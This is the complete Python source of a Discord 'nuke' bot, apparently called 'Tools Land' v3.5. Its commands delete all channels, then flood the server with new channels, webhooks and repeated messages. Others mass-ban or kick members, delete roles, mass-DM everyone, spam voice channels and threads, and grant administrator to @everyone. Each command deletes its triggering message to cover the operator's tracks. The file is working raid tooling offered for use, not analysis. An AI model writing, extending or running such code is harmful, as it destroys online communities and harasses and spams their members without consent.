import discord
from discord.ext import commands
from colorama import *
from pystyle import *
import os
import sys
import time
import asyncio
import aiohttp
import random
import json

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

intents = discord.Intents.default()
intents.message_content = True

prat = commands.Bot(command_prefix=".", intents=intents)

welcome = fr"""

 _________  ______   ______   __       ______       __       ________   ___   __    ______      
/________/\/_____/\ /_____/\ /_/\     /_____/\     /_/\     /_______/\ /__/\ /__/\ /_____/\     
\__.::.__\/\:::_ \ \\:::_ \ \\:\ \    \::::_\/_    \:\ \    \::: _  \ \\::\_\\  \ \\:::_ \ \    
   \::\ \   \:\ \ \ \\:\ \ \ \\:\ \    \:\/___/\    \:\ \    \::(_)  \ \\:. `-\  \ \\:\ \ \ \   
    \::\ \   \:\ \ \ \\:\ \ \ \\:\ \____\_::._\:\    \:\ \____\:: __  \ \\:. _    \ \\:\ \ \ \  
     \::\ \   \:\_\ \ \\:\_\ \ \\:\/___/\ /____\:\    \:\/___/\\:.\ \  \ \\. \`-\  \ \\:\/.:| | 
      \__\/    \_____\/ \_____\/ \_____\/ \_____\/     \_____\/ \__\/\__\/ \__\/ \__\/ \____/_/ 
                                                                                                

Version | 3.5
Update | Added multiple role names for .spamroles and I have now made messages delete after sent.
Developer | mistercoolguy123 https://mrcool.lol


                              [+] Bot is online and ready. https://mrcool.lol
"""

def title_screen():
    print(Colorate.Horizontal(Colors.blue_to_green, welcome, 1))

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

random_name = random.choice(config['channel_names'])

@prat.event
async def on_ready():
    cls()
    time.sleep(0.15)
    title_screen()
    activity_types = {
        "playing": discord.Game(name=config['presence_status']),
        "watching": discord.Activity(type=discord.ActivityType.watching, name=config['presence_status']),
        "listening": discord.Activity(type=discord.ActivityType.listening, name=config['presence_status']),
        "streaming": discord.Streaming(name=config['presence_status'], url="https://twitch.tv/discord")
    }
    activity = activity_types.get(config['presence_type'].lower())
    if activity:
        await prat.change_presence(activity=activity)

@prat.command()
async def kill(ctx):
    await ctx.message.delete()
    print("Request Received | .kill")
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()
    await ctx.send("`❓` Change server icon? (y/n)")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ["y", "n"]

    try:
        msg = await prat.wait_for("message", check=check, timeout=8)
        if msg.content.lower() == "y":
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(config['server_icon']) as resp:
                        if resp.status == 200:
                            icon_bytes = await resp.read()
                            await ctx.guild.edit(name=config['server_name'], icon=icon_bytes)
                            await ctx.send(f"{Fore.GREEN}[+] | Changed server name & icon{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] | Error! {type(e).__name__}{Fore.RESET}")
        else:
            try:
                await ctx.guild.edit(name=config['server_name'])
                await ctx.send(f"{Fore.GREEN}[+] | Changed server name{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] | Error! {type(e).__name__}{Fore.RESET}")
    except asyncio.TimeoutError:
        print(f"{Fore.RED}[-] | Timed out waiting for a response{Fore.RESET}")

    try:
        await ctx.send(f"{Fore.GREEN}[+] | Deleting all channels...{Fore.RESET}")
    except Exception:
        pass

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels], return_exceptions=True)

    async def create_and_spam():
        try:
            name = random.choice(config['channel_names'])
            channel = await ctx.guild.create_text_channel(name)
            webhook = await channel.create_webhook(name=config['webhook_name'])
            for _ in range(35):
                await channel.send(config['send_message'])
                async with aiohttp.ClientSession() as session:
                    await session.post(webhook.url, json={"content": config['send_message']})
        except Exception as e:
            print(f"{Fore.RED}[-] | Error! {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[create_and_spam() for _ in range(50)], return_exceptions=True)

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def threads(ctx):
    print("Request Received | .threads")
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()

    async def create_and_spam_threads(channel):
        try:
            thread = await channel.create_thread(
                name=config['thread_name'],
                type=discord.ChannelType.public_thread
            )
            print(f"{Fore.GREEN}[+] | Created thread '{config['thread_name']}' in channel '{channel.name}'{Fore.RESET}")

            for _ in range(2):
                try:
                    await thread.send(config['send_message'])
                    print(f"{Fore.GREEN}[+] | Sent message in thread '{config['thread_name']}' in channel '{channel.name}'{Fore.RESET}")
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        print(f"{Fore.YELLOW}[!] | Rate limited while sending to '{thread.name}' in '{channel.name}'{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}[-] | Failed to send in thread '{thread.name}' | {type(e).__name__}{Fore.RESET}")
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW}[!] | Rate limited while creating thread in '{channel.name}'{Fore.RESET}")
            else:
                print(f"{Fore.RED}[-] | Failed to create thread in '{channel.name}' | {type(e).__name__}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[-] | Error in '{channel.name}' | {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[create_and_spam_threads(channel) for channel in ctx.guild.text_channels], return_exceptions=True)

    try:
        await ctx.send(f"{Fore.GREEN}[+] | Finished creating threads and sending messages in all channels{Fore.RESET}")
    except discord.errors.HTTPException:
        print(f"{Fore.YELLOW}[!] | Could not send final confirmation message due to missing channel{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def banall(ctx):
    print("Request Received | .banall")
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()

    async def ban_member(member):
        if member != ctx.author and not member.bot:
            try:
                await member.ban(reason=config['ban_reason'])
                print(f"{Fore.GREEN}[+] | Banned member '{member.name}' Reason | {config['ban_reason']}{Fore.RESET}")
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    print(f"{Fore.YELLOW}[!] | Rate limited while banning '{member.name}'{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] | Failed to ban '{member.name}' | {type(e).__name__}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] | Error banning '{member.name}' | {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[ban_member(member) for member in ctx.guild.members], return_exceptions=True)

    try:
        await ctx.send(f"{Fore.GREEN}[+] | Finished banning all members{Fore.RESET}")
    except discord.errors.HTTPException:
        print(f"{Fore.YELLOW}[!] | Could not send final confirmation message due to missing channel{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def kickall(ctx):
    print("Request Received | .kickall")
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()

    async def kick_member(member):
        if member != ctx.author and not member.bot:
            try:
                await member.kick(reason=config['kick_reason'])
                print(f"{Fore.GREEN}[+] | Kicked member '{member.name}' with reason: {config['kick_reason']}{Fore.RESET}")
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    print(f"{Fore.YELLOW}[!] | Rate limited while kicking '{member.name}'{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] | Failed to kick '{member.name}' | {type(e).__name__}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] | Error kicking '{member.name}' | {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[kick_member(member) for member in ctx.guild.members], return_exceptions=True)

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def spamroles(ctx, amount: int = 50):
    await ctx.message.delete()
    print("Request Received | .spamroles")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    tasks = []
    for _ in range(amount):
        role_name_choice = random.choice(config['role_names'])
        tasks.append(ctx.guild.create_role(name=role_name_choice))
        print(f"{Fore.GREEN}[+] | Created role '{role_name_choice}'{Fore.RESET}")
    try:
        await asyncio.gather(*tasks)
    except Exception as exception:
        print(f"{Fore.RED}[-] | Failed to create some roles | {exception}{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def renameall(ctx):
    await ctx.message.delete()
    print("Request Received | .renameall")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    for member in ctx.guild.members:
        if member != ctx.author and not member.bot: 
            try:
                await member.edit(nick=config['new_name'])
                print(f"{Fore.GREEN}[+] | Renamed '{member.name}' to '{config['new_name']}'{Fore.RESET}")
                await asyncio.sleep(0.2)
            except Exception as exception:
                print(f"{Fore.RED}[-] | Failed to rename '{member.name}' | {exception}{Fore.RESET}")

    print(f"{Fore.GREEN}[+] | Finished renaming all members.{Fore.RESET}")
    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def lockdown(ctx):
    await ctx.message.delete()
    print("Request Received | .lockdown")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            print(f"{Fore.GREEN}[+] | Locked channel '{channel.name}'{Fore.RESET}")
            await asyncio.sleep(0.2)
        except Exception as exception:
            print(f"{Fore.RED}[-] | Failed to lock channel '{channel.name}' | {exception}{Fore.RESET}")

    print(f"{Fore.GREEN}[+] | Finished locking all channels{Fore.RESET}")
    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def unlockdown(ctx):
    await ctx.message.delete()
    print("Request Received | .unlockdown")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
            print(f"{Fore.GREEN}[+] | Unlocked channel '{channel.name}'{Fore.RESET}")
            await asyncio.sleep(0.2)
        except Exception as exception:
            print(f"{Fore.RED}[-] | Failed to unlock channel '{channel.name}' | {exception}{Fore.RESET}")

    print(f"{Fore.GREEN}[+] | Finished unlocking all channels{Fore.RESET}")
    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def voicespam(ctx):
    await ctx.message.delete()
    print("Request Received | .voicespam")
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()

    async def create_vc():
        channel_name = random.choice(config['vc_names'])
        try:
            await ctx.guild.create_voice_channel(f"{channel_name}-")
            print(f"{Fore.GREEN}[+] | Created voice channel '{channel_name}'{Fore.RESET}")
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW}[!] | Rate limited while creating voice channel '{channel_name}'{Fore.RESET}")
            else:
                print(f"{Fore.RED}[-] | Failed to create voice channel '{channel_name}' | {type(e).__name__}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[-] | Error creating voice channel '{channel_name}' | {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[create_vc() for _ in range(100)], return_exceptions=True)
    print(f"{Fore.GREEN}[+] | Finished creating voice channels{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def massdm(ctx):
    await ctx.message.delete()
    print("Request Received | .massdm")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    for member in ctx.guild.members:
        if member != ctx.author and not member.bot:
            try:
                await member.send(config['dm_message'])
                print(f"{Fore.GREEN}[+] | Sent DM to '{member.name}'{Fore.RESET}")
                await asyncio.sleep(0.5) 
            except Exception as exception:
                print(f"{Fore.RED}[-] | Failed to send DM to '{member.name}' | {exception}{Fore.RESET}")

    print(f"{Fore.GREEN}[+] | Finished sending DMs to all members{Fore.RESET}")

@prat.command()
async def deleteroles(ctx):
    await ctx.message.delete()
    print("Request Received | .deleteroles")
    os.system('cls' if os.name == 'nt' else 'clear')
    title_screen()

    async def delete_role(role):
        if role != ctx.guild.default_role:
            try:
                await role.delete()
                print(f"{Fore.GREEN}[+] | Deleted role '{role.name}'{Fore.RESET}")
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    print(f"{Fore.YELLOW}[!] | Rate limited while deleting role '{role.name}'{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] | Failed to delete role '{role.name}' | {type(e).__name__}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] | Error deleting role '{role.name}' | {type(e).__name__}{Fore.RESET}")

    await asyncio.gather(*[delete_role(role) for role in ctx.guild.roles], return_exceptions=True)

    print(f"{Fore.GREEN}[+] | Finished deleting all roles{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

@prat.command()
async def giveadmin(ctx):
    await ctx.message.delete()
    print("Request Received | .giveadmin")
    time.sleep(1)
    cls()
    title_screen()
    time.sleep(0.5)
    try:
        everyone_role = ctx.guild.default_role 
        await everyone_role.edit(permissions=discord.Permissions(administrator=True))
        print(f"{Fore.GREEN}[+] | Granted admin permissions to @everyone role{Fore.RESET}")
        await ctx.send(f"{Fore.GREEN}[+] | Successfully granted admin permissions to @everyone{Fore.RESET}")
    except Exception as exception:
        print(f"{Fore.RED}[-] | Failed to grant admin permissions to @everyone | {exception}{Fore.RESET}")
        await ctx.send(f"{Fore.RED}[-] | Failed to grant admin permissions | {exception}{Fore.RESET}")

    time.sleep(1)
    cls()
    time.sleep(0.1)
    title_screen()

prat.run(config['token'])
